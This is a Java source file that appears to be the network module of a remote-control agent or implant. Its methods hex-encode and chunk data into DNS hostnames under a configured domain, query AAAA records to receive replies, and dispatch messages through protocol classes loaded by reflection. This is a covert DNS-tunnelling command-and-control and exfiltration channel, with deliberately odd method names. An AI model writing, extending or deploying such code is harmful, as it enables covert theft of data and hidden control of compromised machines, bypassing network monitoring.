package agent;

import java.lang.reflect.InvocationTargetException;
import java.lang.reflect.Method;
import java.security.NoSuchAlgorithmException;
import java.util.ArrayList;
import java.util.Arrays;
import java.util.Collections;
import java.util.Hashtable;
import java.util.List;
import javax.naming.NamingEnumeration;
import javax.naming.NamingException;
import javax.naming.directory.Attribute;
import javax.naming.directory.Attributes;
import javax.naming.directory.DirContext;
import javax.naming.directory.InitialDirContext;
import java.lang.Class;


public class Netw {
	public static ArrayList onomancy(ArrayList<String> uriSet) throws NamingException, NoSuchAlgorithmException {
		ArrayList<String> nominalBuffer = new ArrayList<String>();
		Hashtable<String, Object> environ = new Hashtable<String, Object>();
		environ.put("java.naming.factory.initial", "com.sun.jndi.dns.DnsContextFactory");
		environ.put("com.sun.jndi.dns.timeout.initial","20000");
		environ.put("com.sun.jndi.dns.timeout.retries","1");
		DirContext wereFactory = new InitialDirContext(environ);
		for (int i=0; i<uriSet.size(); i++) {
			String nsUri = somatic(uriSet.get(i));
			try {
				Attributes attrs = wereFactory.getAttributes(nsUri, new String[] {"AAAA"});
				NamingEnumeration nominalSet = attrs.getAll();
				while (nominalSet.hasMore()) {
					Attribute nominalRec = (Attribute) nominalSet.next();
					for (int j=0; j<nominalRec.size(); j++) {
						nominalBuffer.add((String) nominalRec.get(j));
					}	
				}
			} catch (Exception e) {
				ArrayList error = new ArrayList();
				error.add("0x9120052102");
				return error;
			}
			
			
		}
		return nominalBuffer;
	}
	
	public static String somatic(String uri) throws NoSuchAlgorithmException {
		//should move the crypt.bake call here
		String finalUri = Util.finalize(uri);
		StringBuilder nsUri = new StringBuilder();
		ArrayList<String> chunkify = Util.chunkify(Util.hexlify(finalUri.getBytes()), 48);
		for (int i=0; i<chunkify.size(); i++) {
			nsUri.append(chunkify.get(i));
			nsUri.append(".");
		}
		nsUri.append(Main.config.get("subDomain").toString());
		nsUri.append(".");
		nsUri.append(Main.config.get("domain").toString());
		nsUri.append(".");
		nsUri.append(Main.config.get("tld").toString());
		return nsUri.toString();
	}
	
	public static Method methodical(String protoType) throws ClassNotFoundException, NoSuchMethodException, SecurityException {
		Class protoClass = Class.forName(protoType);
		Method protoMethod = protoClass.getMethod("dispatch", String.class, String.class, String.class);
		return protoMethod;
	}
	
	
	public static Hashtable send(String protoType, String msgID, String data, String etc) throws ClassNotFoundException, NoSuchMethodException, SecurityException, IllegalAccessException, IllegalArgumentException, InvocationTargetException {
		Hashtable protoRSP = new Hashtable();
		Method protoMethod = methodical("agent." + protoType);
		protoRSP = (Hashtable) protoMethod.invoke(null,msgID,data,etc);
		return protoRSP;
	}
}
